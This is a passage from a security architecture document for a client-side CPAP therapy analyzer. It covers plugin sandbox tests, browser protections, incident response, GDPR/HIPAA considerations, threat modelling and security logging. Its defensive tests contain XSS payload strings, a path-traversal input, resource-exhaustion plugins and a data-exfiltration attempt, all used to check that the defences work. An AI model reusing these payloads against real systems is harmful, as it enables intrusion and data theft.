            self.postMessage({ exfiltrated: true });
          } catch (error) {
            self.postMessage({ exfiltrated: false, error: error.message });
          }
        };
      `
    });

    await expect(
      executePlugin(exfiltratingPlugin, { ahi: 5.2, session: 'abc-123' })
    ).rejects.toThrow('PERMISSION_DENIED');
  });

  it('should prevent XSS injection via plugin UI', async () => {
    const xssPlugin: VisualizationPlugin = {
      manifest: createTestManifest({ id: 'xss-plugin' }),
      ComponentType: () => {
        // Attempt to inject script tag
        return React.createElement('div', {
          dangerouslySetInnerHTML: {
            __html: '<script>alert("XSS")</script>'
          }
        });
      }
    };

    // Render plugin in error boundary
    const { container } = render(
      <PluginUIErrorBoundary plugin={xssPlugin.manifest}>
        <xssPlugin.ComponentType data={{}} />
      </PluginUIErrorBoundary>
    );

    // CSP should block inline script execution
    // Even if rendered, script won't execute due to CSP
    expect(container.querySelector('script')).toBeNull();
  });

  it('should prevent storage corruption via invalid result', async () => {
    const corruptingPlugin = createTestPlugin({
      permissions: ['storage.read', 'storage.write', 'data.aggregates'],
      code: `
        self.onmessage = async (e) => {
          const api = e.data.api;

          // Attempt to write corrupted data
          await api.saveResult({
            pluginId: 'corrupting-plugin',
            data: {
              ahi: -999999, // Invalid: negative AHI
              pressure: 'foo', // Invalid: non-number
            }
          });

          self.postMessage({ success: true });
        };
      `
    });

    await expect(executePlugin(corruptingPlugin, {})).rejects.toThrow(ValidationError);
    await expect(executePlugin(corruptingPlugin, {})).rejects.toThrow('Invalid AHI value');
  });
});
```

#### 8.12.3 Resource Limit Enforcement Tests

```typescript
/**
 * Test resource limits are enforced
 */
describe('Resource Limit Enforcement', () => {
  it('should kill plugin consuming excessive CPU time', async () => {
    const cpuHogPlugin = createTestPlugin({
      timeoutMs: 2000,
      code: `
        self.onmessage = () => {
          // CPU-intensive loop
          const start = Date.now();
          let sum = 0;
          while (Date.now() - start < 10000) { // Try to run for 10 seconds
            sum += Math.sqrt(Math.random());
          }
          self.postMessage({ success: true, sum });
        };
      `,
    });

    await expect(executePlugin(cpuHogPlugin, {})).rejects.toThrow(TimeoutError);
  });

  it('should prevent plugin from exhausting storage quota', async () => {
    const storageHogPlugin = createTestPlugin({
      permissions: ['storage.write'],
    });

    const dataProvider = createSecureDataProvider(storageHogPlugin);

    // Attempt to save huge result (100MB)
    const hugeResult: AnalysisResult = {
      pluginId: storageHogPlugin.manifest.id,
      data: {
        // Generate 100MB of data
        hugeArray: new Array(10_000_000).fill('x'.repeat(10)),
      },
    };

    await expect(dataProvider.saveResult(hugeResult)).rejects.toThrow(/too large|limit/i);
  });
});
```

---

---

## 9. Browser Security Features

### 9.1 Same-Origin Policy

**Enforcement**: Automatic by browser.

**Implications**:

- IndexedDB scoped to origin
- OPFS scoped to origin
- LocalStorage scoped to origin
- Service Worker scoped to origin
- No cross-origin data access without CORS

**Testing**:

```typescript
// Verify same-origin isolation (manual test)
async function testOriginIsolation(): Promise<void> {
  // Attempt to access IndexedDB from other origin (should fail)
  // This test would be run from a different origin (e.g., http://attacker.com)
  try {
    const db = await window.indexedDB.open('cpap-analyzer', 1);
    console.error('SECURITY FAILURE: Cross-origin access to IndexedDB succeeded');
  } catch (error) {
    console.log('✓ Same-origin policy enforced for IndexedDB');
  }
}
```

### 9.2 Secure Contexts (HTTPS Requirement)

**Enforcement**:

- Service Workers require HTTPS (except localhost)
- OPFS requires secure context
- Web Crypto API requires secure context
- Permissions API `persist()` requires secure context

**Development**: `localhost` is treated as secure context.

**Production**: Enforce HTTPS:

```javascript
// Redirect HTTP to HTTPS (if somehow accessed via HTTP)
if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
  location.replace(`https:${location.href.substring(location.protocol.length)}`);
}
```

**HSTS Header**:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### 9.3 Permissions API

**Storage Persistence**:

```typescript
async function requestPersistentStorage(): Promise<boolean> {
  if (!navigator.storage?.persist) {
    console.warn('Storage persistence not supported');
    return false;
  }

  // Check if already persistent
  const isPersisted = await navigator.storage.persisted();
  if (isPersisted) {
    return true;
  }

  // Request persistence
  const granted = await navigator.storage.persist();

  if (granted) {
    console.log('✓ Persistent storage granted');
  } else {
    console.warn('Persistent storage denied (data may be evicted)');
    notifyUser(
      'storage-persistence-denied',
      'Your browser may delete data if storage is low. Save regular backups.',
    );
  }

  return granted;
}

// Request on first data import
async function onFirstImport(): Promise<void> {
  await requestPersistentStorage();
  // ... proceed with import
}
```

**File Access Permission**:

```typescript
// File System Access API requires user gesture
async function selectSDCard(): Promise<FileSystemDirectoryHandle> {
  // Must be called in response to user action (button click)
  try {
    const dirHandle = await window.showDirectoryPicker({
      mode: 'read',
      startIn: 'downloads', // Suggest starting directory
    });

    // Permission granted, return handle
    return dirHandle;
  } catch (error) {
    if (error.name === 'AbortError') {
      console.log('User cancelled directory selection');
    } else {
      console.error('File system access error:', error);
    }
    throw error;
  }
}
```

### 9.4 Iframe Protection

**X-Frame-Options** (defense in depth):

```http
X-Frame-Options: DENY
```

**CSP `frame-ancestors`** (modern equivalent):

```http
Content-Security-Policy: frame-ancestors 'none';
```

**Rationale**: Prevent clickjacking attacks where attacker embeds app in iframe and overlays fake UI.

### 9.5 Browser Extension Security

**Note**: Browser extensions with broad permissions (access to all sites) can bypass same-origin policy and access IndexedDB/OPFS.

**Mitigation**:

- User responsibility to vet extensions
- Recommend disabling extensions on sensitive sites
- Log security events for audit (extensions can't hide from console)

**Detection** (best-effort):

```typescript
function detectExtensionActivity(): void {
  // Monitor for unexpected storage mutations
  const observer = new MutationObserver(() => {
    console.warn('[Security] DOM mutation detected (possible extension activity)');
  });

  observer.observe(document.body, {
    childList: true,
    subtree: true,
  });

  // Monitor for unexpected network requests
  const originalFetch = window.fetch;
  window.fetch = function (...args) {
    console.log('[Network]', args[0]);
    return originalFetch.apply(this, args);
  };
}
```

---

## 10. Vulnerability Management

### 10.1 Security Audit Process

#### 10.1.1 Automated Scanning

**Dependency Auditing** (CI pipeline):

```bash
# package.json scripts
{
  "scripts": {
    "audit": "npm audit --audit-level=high",
    "audit:fix": "npm audit fix",
    "audit:report": "npm audit --json > audit-report.json"
  }
}
```

**Static Analysis** (ESLint security rules):

```json
{
  "extends": ["plugin:security/recommended"],
  "rules": {
    "security/detect-eval-with-expression": "error",
    "security/detect-non-literal-fs-filename": "error",
    "security/detect-unsafe-regex": "error",
    "security/detect-buffer-noassert": "error",
    "security/detect-child-process": "error",
    "security/detect-disable-mustache-escape": "error",
    "security/detect-no-csrf-before-method-override": "error",
    "security/detect-non-literal-regexp": "error",
    "security/detect-non-literal-require": "error",
    "security/detect-object-injection": "warn",
    "security/detect-possible-timing-attacks": "warn",
    "security/detect-pseudoRandomBytes": "error"
  }
}
```

**TypeScript Strict Mode**:

```json
{
  "compilerOptions": {
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "noImplicitOverride": true,
    "noPropertyAccessFromIndexSignature": true
  }
}
```

#### 10.1.2 Manual Security Review

**Pre-Release Checklist**:

- [ ] Run `npm audit` → No high/critical vulnerabilities
- [ ] Review new dependencies → Follow Section 5.2 checklist
- [ ] Review file parsing code → No buffer overflows, validate all inputs
- [ ] Review CSP headers → Match Section 6.1 policy
- [ ] Review network requests → All requests to allowed domains only
- [ ] Test plugin sandboxing → Plugins cannot escape DataProvider
- [ ] Test export encryption → AES-256-GCM with proper key derivation
- [ ] Test data deletion → Verify hard delete removes all data
- [ ] Test XSS protection → User input sanitized before rendering
- [ ] Review changelog → No secrets/credentials accidentally committed

**Quarterly Security Audit**:

- Full codebase review for security issues
- Penetration testing (local only, no remote attacks)
- Dependency tree audit (transitive dependencies)
- CSP policy review
- Update threat model

### 10.2 Incident Response Plan

#### 10.2.1 Incident Classification

**Severity Levels**:

| Level        | Description                              | Response Time | Example                                 |
| ------------ | ---------------------------------------- | ------------- | --------------------------------------- |
| **Critical** | Active data exfiltration, RCE exploit    | Immediate     | Compromised dependency transmitting PHI |
| **High**     | Potential data breach, XSS vulnerability | 24 hours      | Unescaped user input in chart labels    |
| **Medium**   | DoS, client-side crash, logic error      | 7 days        | Malformed EDF crashes parser            |
| **Low**      | UI bug, performance issue                | 30 days       | Slow query on large datasets            |

#### 10.2.2 Incident Response Workflow

**Step 1: Detection**

- Automated: Dependency audit failure, ESLint security error
- Manual: User report, security researcher disclosure

**Step 2: Triage**

- Assess severity (Critical/High/Medium/Low)
- Determine scope (affected versions, users)
- Classify vulnerability type (OWASP Top 10)

**Step 3: Containment**

- If critical: Immediate patch or temporary workaround
- If high: Schedule emergency patch release
- If medium/low: Schedule fix in next sprint

**Step 4: Remediation**

- Implement fix
- Write regression test
- Update security audit checklist

**Step 5: Disclosure**

- Document vulnerability in CHANGELOG
- Publish security advisory (GitHub Security Advisories)
- Notify users (in-app notification for critical issues)

**Step 6: Post-Mortem**

- Root cause analysis (use RCA skill)
- Update threat model
- Improve detection/prevention

#### 10.2.3 Security Contact

**Responsible Disclosure**:

- Email: security@cpap-analyzer.example.com
- Signal: +1-XXX-XXX-XXXX (end-to-end encrypted)
- PGP Key: [Public key fingerprint]

**Response SLA**:

- Acknowledge report within 24 hours
- Initial assessment within 72 hours
- Fix timeline communicated within 7 days

### 10.3 Disclosure Policy

#### 10.3.1 Coordinated Disclosure

**Process**:

1. Researcher reports vulnerability privately
2. Security team triages and confirms
3. Patch developed and tested
4. Patch released (no public disclosure of details)
5. After 90 days or patch adoption >80%, publish full advisory

**Researcher Recognition**:

- Credit in CHANGELOG
- Optional public acknowledgment (if researcher consents)
- No bug bounty program (open-source, volunteer-developed)

#### 10.3.2 Public Advisory Format

**Security Advisory Template**:

```markdown
# Security Advisory: [YYYY-MM-001] [Title]

**CVE**: (if assigned)
**Severity**: Critical/High/Medium/Low
**Affected Versions**: X.X.X - Y.Y.Y
**Fixed Version**: Z.Z.Z
**Published**: YYYY-MM-DD

## Summary

[Brief description of vulnerability]

## Impact

[What attacker could achieve]

## Affected Components

[Which files/modules are vulnerable]

## Mitigation

[Upgrade to version Z.Z.Z or apply workaround]

## Timeline

- YYYY-MM-DD: Vulnerability reported by [Researcher]
- YYYY-MM-DD: Confirmed by security team
- YYYY-MM-DD: Patch released (version Z.Z.Z)
- YYYY-MM-DD: Advisory published

## Credit

[Researcher name/handle] (optional)

## References

- [GitHub commit fixing vulnerability]
- [Related CVE entries]
```

---

## 11. Compliance Considerations

### 11.1 GDPR Compliance

**Applicability**: Even though the application is client-side only and data never leaves the device, GDPR principles guide design:

#### 11.1.1 User Rights

| Right                         | Implementation                                                      |
| ----------------------------- | ------------------------------------------------------------------- |
| **Right to Access**           | Users have full access to all their data via UI and export function |
| **Right to Rectification**    | Users can edit session notes, tags, and metadata                    |
| **Right to Erasure**          | Users can delete individual sessions or all data ("Complete Wipe")  |
| **Right to Data Portability** | JSON export format (unencrypted or encrypted) allows data transfer  |
| **Right to Object**           | No automated decision-making; all analysis is user-initiated        |

#### 11.1.2 Data Minimization

**Principles**:

- Collect only essential data (CPAP therapy metrics, no extraneous personal information)
- No tracking, analytics, or telemetry
- Optional integrations (Fitbit, weather) are opt-in only
- User controls retention period (no forced data retention)

#### 11.1.3 Privacy by Design

**Implemented Principles**:

1. **Proactive not reactive** — Privacy built into architecture (client-side only)
2. **Privacy as default** — No integrations enabled by default
3. **Privacy embedded** — No way to accidentally transmit data
4. **Full functionality** — Privacy doesn't compromise features
5. **End-to-end security** — Encryption available for exports
6. **Visibility and transparency** — User always knows what data is stored
7. **Respect for user privacy** — User has absolute control over data

### 11.2 Medical Data Handling

#### 11.2.1 HIPAA Awareness

**Status**: CPAP Analyzer is **not HIPAA-covered** because:

- Not a healthcare provider, health plan, or healthcare clearinghouse
- No server/database (no "covered entity" or "business associate")
- User is self-managing their own data

**However**: Design follows HIPAA principles as best practice:

- **Confidentiality**: Data stored locally, encrypted for exports
- **Integrity**: Validation prevents data corruption
- **Availability**: User always has access to their data

#### 11.2.2 Clinical Data Standards

**HL7 FHIR Compatibility** (future consideration):

- Export format could be extended to HL7 FHIR JSON
- Would enable interoperability with EHR systems
- Requires mapping CPAP metrics to FHIR Observation resources

#### 11.2.3 Medical Device Regulations

**Status**: CPAP Analyzer is **not a medical device** because:

- No diagnostic claims
- No treatment recommendations
- No prescribing functionality
- Purely informational (patient-driven analysis)

**Disclaimers**:

```typescript
const MEDICAL_DISCLAIMER = `
This application is for informational purposes only and is not intended to diagnose, treat, cure, or prevent any disease or condition. CPAP Analyzer does not provide medical advice. Always consult with a qualified healthcare provider regarding your therapy.

The data and analyses presented are based on information from your CPAP machine and should not replace regular medical check-ups or professional medical advice. Do not adjust your CPAP settings without consulting your healthcare provider.
`;

// Display on first launch and in About section
function showMedicalDisclaimer(): void {
  showDialog({
    title: 'Medical Disclaimer',
    message: MEDICAL_DISCLAIMER,
    buttons: ['I Understand'],
  });
}
```

### 11.3 Data Retention Policy

**User-Controlled**:

```typescript
interface RetentionPolicy {
  enabled: boolean;
  maxAgeMonths: number; // 0 = indefinite
  autoDelete: boolean; // Auto-delete data older than maxAgeMonths
}

// Default: indefinite retention
const DEFAULT_RETENTION: RetentionPolicy = {
  enabled: false,
  maxAgeMonths: 0,
  autoDelete: false,
};

// User can configure in Settings
async function applyRetentionPolicy(): Promise<void> {
  const policy = await getRetentionPolicy();

  if (!policy.enabled || policy.maxAgeMonths === 0) {
    return; // No retention limit
  }

  const cutoffDate = new Date();
  cutoffDate.setMonth(cutoffDate.getMonth() - policy.maxAgeMonths);

  const oldSessions = await querySessionsBefore(cutoffDate);

  if (policy.autoDelete) {
    // Auto-delete old sessions
    for (const session of oldSessions) {
      await hardDeleteSession(session.id);
    }
    console.log(
      `[Retention] Auto-deleted ${oldSessions.length} sessions older than ${policy.maxAgeMonths} months`,
    );
  } else {
    // Notify user
    notifyUser(
      'retention-policy-triggered',
      `${oldSessions.length} sessions are older than your retention policy (${policy.maxAgeMonths} months). ` +
        `Consider deleting them or exporting for backup.`,
    );
  }
}

// Run retention policy check weekly
setInterval(applyRetentionPolicy, 7 * 24 * 60 * 60 * 1000);
```

### 11.4 International Considerations

**Localization**:

- UI localized for international users
- Date/time formats respect locale
- Unit conversion (metric/imperial) for physiological values

**Legal Compliance**:

- GDPR (EU): Covered by client-side architecture
- CCPA (California): Not applicable (no data collection)
- LGPD (Brazil): Covered by client-side architecture
- PIPEDA (Canada): Covered by client-side architecture

**No Region-Blocking**: Application accessible worldwide (no geofencing).

### 11.5 Open Source License

**License**: MIT

**Security Implications**:

- Source code is public → Anyone can audit for vulnerabilities
- Transparency builds trust → Users can verify privacy claims
- Community contributions → More eyes on code, faster bug discovery
- No security through obscurity → Rely on strong architecture, not secrecy

**License Compatibility**:

- All dependencies must have OSI-approved licenses
- No GPL dependencies (license incompatibility with MIT)
- Preferred licenses: MIT, Apache 2.0, BSD

---

## 12. Security Testing

### 12.1 Automated Security Tests

**Unit Tests** (Vitest):

```typescript
// src/parsers/edf-validator.test.ts
describe('EDF Parser Security', () => {
  it('should reject files exceeding size limit', async () => {
    const largeFile = new File([new Uint8Array(600 * 1024 * 1024)], 'large.edf');
    await expect(validateFileSize(largeFile)).rejects.toThrow('FILE_TOO_LARGE');
  });

  it('should reject invalid header byte count', async () => {
    const invalidHeader = createInvalidHeader({ headerBytes: 999 });
    await expect(validateEDFHeader(invalidHeader)).rejects.toThrow('INVALID_HEADER');
  });

  it('should sanitize annotation text', () => {
    const malicious = '+123.4\x1510.0\x15<script>alert(1)</script>\x00';
    const annotation = parseAnnotation(new TextEncoder().encode(malicious));
    expect(annotation.text).not.toContain('<script>');
    expect(annotation.text).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it('should prevent path traversal in OPFS paths', () => {
    expect(() => validateOPFSPath('../sensitive/data')).toThrow('PATH_TRAVERSAL');
    expect(() => validateOPFSPath('signals//chunk.bin')).toThrow('PATH_TRAVERSAL');
  });

  it('should enforce plugin permissions', async () => {
    const plugin = { id: 'test-plugin', permissions: ['read:aggregates'] };
    const provider = createSandboxedDataProvider(plugin);

    // Should succeed (permission granted)
    await expect(provider.getNightlyAggregates(dateRange)).resolves.toBeTruthy();

    // Should fail (permission not granted)
    await expect(provider.getSignalData('session-id', 'Flow')).rejects.toThrow('PERMISSION_DENIED');
  });
});
```

**E2E Security Tests** (Playwright):

```typescript
// tests/security/xss.spec.ts
test('should sanitize user input in session notes', async ({ page }) => {
  await page.goto('/');

  // Import session
  await importTestSession(page);

  // Add malicious note
  await page.fill('[data-testid="session-notes"]', '<img src=x onerror=alert(1)>');
  await page.click('[data-testid="save-notes"]');

  // Verify XSS is prevented
  const noteContent = await page.textContent('[data-testid="session-notes-display"]');
  expect(noteContent).toBe('<img src=x onerror=alert(1)>'); // Text, not executed

  // Verify no alert fired
  page.on('dialog', () => {
    throw new Error('Unexpected alert dialog (XSS)');
  });
});

test('should enforce CSP', async ({ page }) => {
  // Navigate to app
  await page.goto('/');

  // Inject inline script (should be blocked by CSP)
  const scriptFired = await page.evaluate(() => {
    const script = document.createElement('script');
    script.textContent = 'window.__csp_bypass__ = true';
    document.body.appendChild(script);
    return window.__csp_bypass__ === true;
  });

  expect(scriptFired).toBe(false);
});
```

### 12.2 Penetration Testing

**Scope**:

- Client-side attacks only (XSS, CSRF, local storage access)
- Malicious file uploads (malformed EDF files)
- Plugin sandbox escape attempts
- Browser extension interactions

**Out of Scope**:

- Server-side attacks (no server)
- Network attacks (no network by default)
- Physical attacks (device compromise)

**Test Cases**:

1. **XSS**: Inject scripts in notes, tags, filenames, EDF annotations
2. **File Parsing**: Fuzz EDF files with malformed headers, invalid data
3. **Storage**: Attempt to access IndexedDB/OPFS from other origins
4. **Plugins**: Attempt to access storage/network directly without permissions
5. **CSP**: Attempt to load external scripts, inline scripts, eval()
6. **Export**: Verify encryption cannot be bypassed, keys not in export

**Tools**:

- **ZAP (OWASP Zed Attack Proxy)**: Automated scanning
- **Burp Suite**: Manual testing, interception
- **AFL (American Fuzzy Lop)**: Fuzz EDF parser with malformed files
- **ESLint Security Plugin**: Static analysis

### 12.3 Threat Modeling

**STRIDE Model**:

| Threat                     | Mitigation                                                   |
| -------------------------- | ------------------------------------------------------------ |
| **Spoofing**               | N/A (no authentication, single-user app)                     |
| **Tampering**              | IndexedDB transactions, OPFS write validation, CSP           |
| **Repudiation**            | N/A (no multi-user actions to repudiate)                     |
| **Information Disclosure** | Client-side only, no network transmission, encrypted exports |
| **Denial of Service**      | File size limits, timeout enforcement, resource limits       |
| **Elevation of Privilege** | Plugin sandboxing, permission model, CSP                     |

**Attack Tree** (simplified):

```
Goal: Exfiltrate PHI
├── Compromise Application
│   ├── XSS Injection → Mitigated by input sanitization
│   ├── Malicious Plugin → Mitigated by sandbox + permissions
│   └── Supply Chain Attack → Mitigated by dependency audit
├── Compromise Browser
│   ├── Malicious Extension → User responsibility
│   └── Browser Vulnerability → Trust browser vendor
└── Compromise Device
    ├── Malware → Out of scope (OS-level)
    └── Physical Access → Out of scope (device encryption)
```

---

## 13. Monitoring and Logging

### 13.1 Client-Side Security Logging

**Security Event Types**:

```typescript
type SecurityEventType =
  | 'csp-violation'
  | 'parse-error'
  | 'permission-denied'
  | 'quota-exceeded'
  | 'network-policy-violation'
  | 'plugin-error'
  | 'authentication-failure' // Future: if multi-user
  | 'data-corruption';

interface SecurityEvent {
  type: SecurityEventType;
  timestamp: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  message: string;
  details: Record<string, unknown>;
  stackTrace?: string;
}

// Store in IndexedDB for user review
async function logSecurityEvent(event: SecurityEvent): Promise<void> {
  console.warn('[Security Event]', event);

  const db = await DatabaseConnection.open();
  await db
    .transaction('security_log', 'readwrite')
    .objectStore('security_log')
    .add({
      ...event,
      id: crypto.randomUUID(),
    });

  // If critical, show user notification
  if (event.severity === 'critical') {
    notifyUser('security-alert', event.message);
  }
}
```

**User-Accessible Security Log**:

```typescript
// Settings → Security → View Security Log
async function getSecurityLog(): Promise<SecurityEvent[]> {
  const db = await DatabaseConnection.open();
  const events = await db.transaction('security_log').objectStore('security_log').getAll();

  return events.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

// Export security log for debugging
async function exportSecurityLog(): Promise<Blob> {
  const events = await getSecurityLog();
  const json = JSON.stringify(events, null, 2);
  return new Blob([json], { type: 'application/json' });
}
```

### 13.2 Performance Monitoring (Privacy-Preserving)

**Client-Side Only**:

```typescript
interface PerformanceMetric {
  operation: string;
  durationMs: number;
  timestamp: string;
}

// Store last N metrics for user review
const performanceLog: PerformanceMetric[] = [];
const MAX_PERFORMANCE_LOG_SIZE = 1000;

function logPerformanceMetric(operation: string, durationMs: number): void {
  performanceLog.push({
    operation,
    durationMs,
    timestamp: new Date().toISOString(),
  });

  // Trim log if too large
  if (performanceLog.length > MAX_PERFORMANCE_LOG_SIZE) {
    performanceLog.shift();
  }

  // NEVER send to remote server
}

// User can export for debugging
function exportPerformanceLog(): Blob {
  const json = JSON.stringify(performanceLog, null, 2);
  return new Blob([json], { type: 'application/json' });
}
```

---

## 14. Summary

### 14.1 Security Principles

1. **Privacy by Default**: No data leaves the browser unless explicitly configured
2. **Client-Side Only**: All computation, storage, and analysis local
3. **Defense in Depth**: Multiple layers of security controls
4. **Least Privilege**: Plugins have minimal permissions, no direct storage access
5. **Input Validation**: Strict validation of all external input (EDF files, user input)
6. **Transparency**: Open-source code, auditable by anyone
7. **User Control**: User has complete control over data retention and deletion

### 14.2 Critical Controls

| Control                 | Purpose                                                  | Status         |
| ----------------------- | -------------------------------------------------------- | -------------- |
| **Input Validation**    | Prevent buffer overflows, code injection                 | ✅ Implemented |
| **CSP**                 | Prevent XSS, code injection                              | ✅ Implemented |
| **Worker Isolation**    | Contain parser bugs, prevent DoS                         | ✅ Implemented |
| **Plugin Sandboxing**   | Prevent malicious plugins from accessing storage/network | ✅ Implemented |
| **Dependency Auditing** | Detect vulnerable dependencies                           | ✅ Implemented |
| **Network Policy**      | Prevent unauthorized data exfiltration                   | ✅ Implemented |
| **Export Encryption**   | Protect exported data                                    | ✅ Implemented |
| **Secure Deletion**     | Ensure data is removed when requested                    | ✅ Implemented |

### 14.3 Residual Risks

| Risk                      | Likelihood | Impact   | Mitigation                                 |
| ------------------------- | ---------- | -------- | ------------------------------------------ |
| **Browser vulnerability** | Low        | Critical | Trust browser vendor, keep browser updated |
| **Malicious extension**   | Medium     | High     | User responsibility to vet extensions      |
| **Device compromise**     | Low        | Critical | User responsibility to secure device       |
| **Supply chain attack**   | Low        | High     | Dependency auditing, version pinning       |
| **Zero-day in parser**    | Low        | Medium   | Worker isolation limits impact             |

### 14.4 Future Enhancements

| Enhancement                                    | Priority | Timeframe          |
| ---------------------------------------------- | -------- | ------------------ |
| **Security audit by third-party firm**         | High     | Before 1.0 release |
| **Automated fuzzing of EDF parser**            | High     | Q2 2026            |
| **Bug bounty program**                         | Medium   | Post-1.0           |
| **Formal security certification**              | Low      | Long-term          |
| **Hardware security module (HSM) integration** | Low      | Not planned        |

---

## 15. References

### 15.1 Standards and Guidelines

- **OWASP Top 10** (2021): https://owasp.org/www-project-top-ten/
- **CWE Top 25** (2023): https://cwe.mitre.org/top25/
- **GDPR**: https://gdpr.eu/
- **HIPAA Security Rule**: https://www.hhs.gov/hipaa/for-professionals/security/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **Mozilla Web Security Guidelines**: https://infosec.mozilla.org/guidelines/web_security

### 15.2 Browser Security Documentation

- **CSP Level 3**: https://www.w3.org/TR/CSP3/
- **Same-Origin Policy**: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
- **Secure Contexts**: https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts
- **OPFS**: https://developer.mozilla.org/en-US/docs/Web/API/File_System_API
- **Web Crypto API**: https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API

### 15.3 Related Documentation

- [storage-architecture.md](storage-architecture.md) — IndexedDB and OPFS design
- [resmed-machine-support.md](resmed-machine-support.md) — EDF file parsing
- [frontend-architecture.md](frontend-architecture.md) — UI and state management
- [plugin-architecture.md](.claude/skills/plugin-architecture/SKILL.md) — Plugin system design
- [data-analysis.md](data-analysis.md) — Analysis pipeline architecture

---

**End of Security Architecture Document**

**Last Updated**: 2026-02-10  
**Version**: 1.0  
**Authors**: Security Agent, with input from all implementation agents  
**Review Cadence**: Quarterly security audit, update after any security incident
